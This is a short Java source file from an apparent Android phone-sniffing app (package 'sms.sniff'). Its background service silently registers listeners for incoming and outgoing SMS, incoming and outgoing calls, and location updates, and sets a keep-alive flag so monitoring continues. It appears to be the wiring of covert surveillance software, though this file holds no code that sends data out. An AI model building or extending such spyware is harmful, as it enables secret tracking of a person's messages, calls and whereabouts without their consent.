package sms.sniff.core;

import sms.sniff.call.IncomingOutgoingCall;
import sms.sniff.location.LocationUpdater;
import sms.sniff.sms.Incoming;
import sms.sniff.sms.Outgoing;
import sms.sniff.utils.SharedPreferencesEditor;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

public class DynamicRegisterService extends Service{

	private BroadcastReceiver incoming;
	private Intent outgoing;
	private SharedPreferencesEditor sharedPreferencesEditor;
	private IncomingOutgoingCall incomingOutgoingCall;
	private LocationUpdater locationUpdater;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	
	@Override
	public void onCreate() {
		super.onCreate();
		
		incoming = new Incoming();
		registerReceiver(incoming, new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
		
		outgoing = new Intent(this, Outgoing.class);
		startService(outgoing);
		
		incomingOutgoingCall = new IncomingOutgoingCall();
		registerReceiver(incomingOutgoingCall, new IntentFilter("android.intent.action.PHONE_STATE"));
		registerReceiver(incomingOutgoingCall, new IntentFilter("android.intent.action.NEW_OUTGOING_CALL"));
		
		locationUpdater = new LocationUpdater(this);
		
		sharedPreferencesEditor = new SharedPreferencesEditor(this);
		sharedPreferencesEditor.keepAlive(true);
		
		
	}
	
	@Override
	public void onDestroy() {
		
		unregisterReceiver(incomingOutgoingCall);
		unregisterReceiver(incoming);
		stopService(outgoing);
		
		locationUpdater.unregister();
		
		sharedPreferencesEditor.keepAlive(false);
		
		super.onDestroy();
	}
}
